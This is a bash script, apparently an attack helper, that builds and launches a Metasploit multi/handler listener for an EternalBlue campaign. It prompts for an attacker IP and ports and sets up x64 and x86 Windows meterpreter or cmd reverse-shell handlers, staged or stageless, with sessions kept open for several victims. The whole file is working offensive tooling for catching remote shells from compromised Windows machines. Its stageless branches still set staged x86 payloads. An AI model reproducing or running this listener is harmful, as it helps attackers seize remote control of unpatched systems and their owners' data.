#!/bin/bash
cat << "EOF"
  __
  /,-
  ||)
  \\_, )
   `--'
EOF
echo Enternal Blue Metasploit Listener
echo
echo LHOST for reverse connection:
read ip
echo LPORT for x64 reverse connection:
read portOne
echo LPORT for x86 reverse connection:
read portTwo
echo Enter 0 for meterpreter shell or 1 for regular cmd shell:
read cmd
    if [[ $cmd -eq 0 ]]
    then
    echo Type 0 if this is a staged payload or 1 if it is for a stageless payload
    read cmd
        if [[ $cmd -eq 0 ]]
            then
            echo Starting listener \(staged\)...
            touch config.rc
	        echo use exploit/multi/handler > config.rc
	        echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> config.rc
	        echo set LHOST $ip >> config.rc
            echo set LPORT $portOne >> config.rc
            echo set ExitOnSession false >> config.rc
            echo set EXITFUNC thread >> config.rc
            echo exploit -j >> config.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> config.rc
            echo set LPORT $portTwo >> config.rc
                echo exploit -j >> config.rc
            /etc/init.d/postgresql start
            msfconsole -r config.rc
            /etc/init.d/postgresql stop
                rm config.rc
        elif [[ $cmd -eq 1 ]]
            then
            echo Starting listener \(stageless\)...
            touch config.rc
	        echo use exploit/multi/handler > config.rc
	        echo set PAYLOAD windows/x64/meterpreter_reverse_tcp >> config.rc
	        echo set LHOST $ip >> config.rc
            echo set LPORT $portOne >> config.rc
            echo set ExitOnSession false >> config.rc
            echo set EXITFUNC thread >> config.rc
            echo exploit -j >> config.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> config.rc
            echo set LPORT $portTwo >> config.rc
                echo exploit -j >> config.rc
            /etc/init.d/postgresql start
            msfconsole -r config.rc
            /etc/init.d/postgresql stop
                rm config.rc
        fi
    elif [[ $cmd -eq 1 ]]
    then
    echo Type 0 if this is a staged payload or 1 if it is for a stageless payload
    read cmd
        if [[ $cmd -eq 0 ]]
        then
            echo Starting listener \(staged\)...
            touch config.rc
            echo use exploit/multi/handler > config.rc
            echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
            echo set LHOST $ip >> config.rc
            echo set LPORT $portOne >> config.rc
            echo set ExitOnSession false >> config.rc
            echo set EXITFUNC thread >> config.rc
            echo exploit -j >> config.rc
            echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
            echo set LPORT $portTwo >> config.rc
                echo exploit -j >> config.rc
            /etc/init.d/postgresql start
            msfconsole -r config.rc
            /etc/init.d/postgresql stop
                rm config.rc
        elif [[ $cmd -eq 1 ]]
         then
            echo Starting listener \(stageless\)...
            touch config.rc
            echo use exploit/multi/handler > config.rc
            echo set PAYLOAD windows/x64/shell_reverse_tcp >> config.rc
            echo set LHOST $ip >> config.rc
            echo set LPORT $portOne >> config.rc
            echo set ExitOnSession false >> config.rc
            echo set EXITFUNC thread >> config.rc
            echo exploit -j >> config.rc
            echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
            echo set LPORT $portTwo >> config.rc
                echo exploit -j >> config.rc
            /etc/init.d/postgresql start
            msfconsole -r config.rc
            /etc/init.d/postgresql stop
                rm config.rc
        fi
    else
        echo Invalid option...exiting...
    fi

